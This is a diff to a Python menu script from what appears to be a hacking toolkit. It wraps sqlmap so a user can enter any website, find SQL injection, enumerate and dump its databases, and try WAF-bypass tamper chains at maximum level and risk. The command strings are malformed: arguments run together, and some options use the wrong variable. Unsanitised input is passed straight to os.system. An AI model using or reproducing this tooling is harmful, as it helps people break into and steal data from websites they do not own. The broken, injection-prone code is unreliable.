@@ -507,8 +507,10 @@ def hydra():
      	print("[!] Try again")
      	print()
      	hydra()
-		
+
 def sql():
+	 os.system("cd ~/sqlmap")
+	 print()
 	 print("1.Download Sqlmap")
 	 print("2.Scan a website to find sql vuln")
 	 print("3.Get database")
@@ -523,27 +525,54 @@ def sql():
 	 	print("Sqlmap Successfully Installed")
 	 	sql()
 	 elif j == '2':
-	 	os.system("cd ~/Blackpearl-framework/module;python scan.py")
+	 	w = input("Enter Website : ")
+	 	os.system("python sqlmap.py -u" + w + '%27')
 	 	sql()
 	 elif j == '3':
-	 	os.system("cd ~/Blackpearl-framework/module;python db.py")
+	 	w = input("Enter Website : ")
+	 	os.system("python sqlmap.py -u" + w + '--dbs')
+	 	sql()
 	 elif j == '4':
-	 	os.system("cd ~/Blackpearl-framework/module;python table.py")
+	 	w = input("Enter Website : ")
+	 	d = input("Enter Database : ")
+	 	os.system("python sqlmap.py -u" + w + "--tables -D" + d)
 	 	sql()
 	 elif j == '5':
-	 	os.system("cd ~/Blackpearl-framework/module;python column.py")
+	 	w = input("Enter website : ")
+	 	d = input("Enter Database : ")
+	 	k = input("Enter Table : ")
+	 	os.system("python sqlmap.py -u" + w + "--columns -D" + d + '-T' + k)
 	 	sql()
 	 elif j == '6':
-	 	os.system("cd ~/Blackpearl-framework/module;python dump.py")
-	 	sql()
+	 	w = input("Enter Website : ")
+	 	d = input("Enter Datebase : ")
+	 	k = input("Enter Table : ")
+	 	os.system("python sqlmap.py -u" + w + "--dump -D" + d + "-T" + k)
 	 elif j == '7':
-	 	os.system("cd ~/Blackpearl-framework/module;python waf.py")
-	 	sql()
-	 elif j == 'help':
-	 	 os.system("\n This is an automater for exploiting a website with sql vuln using sqlmap. \n back - To go back pearl console \n ")
-	 	 sql()
+	 	print("1.General Tamper Testing")
+	 	print("2.MSSQL")
+	 	print("3.MySql")
+	 	m = input("Enter WAF Option : ")
+	 	if m == '3':
+	 			w = input("Enter Website : ")
+	 			os.system("python sqlmap -u" + w + "--level=5 --risk=3 -p 'item1 - - tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor")
+	 			sql()
+	 	elif m == '1':
+	 			os.system("python sqlmap -u" + j + "--level=5 --risk=3 -p 'item1' - - tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes")
+	 			sql()
+	 	elif m == '2':
+	 			os.system("python sqlmap -u" + j + "--level=5 --risk=3 -p 'item1' - - tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes")
+	 			sql()
 	 elif j == 'back':
-	 	 main() 
+	 			main()
+	 elif j == 'help':
+	 			print("\n This is an automater for performing sql injection to a websiteb usig sqlmap. \n back - To go back to pearl console \n ")
+	 else:
+	 	print("[!] Invalid input")
+	 	print("[!] Try again")
+	 	sql()		
+
+	 	 
 	
 def info():
 	print()
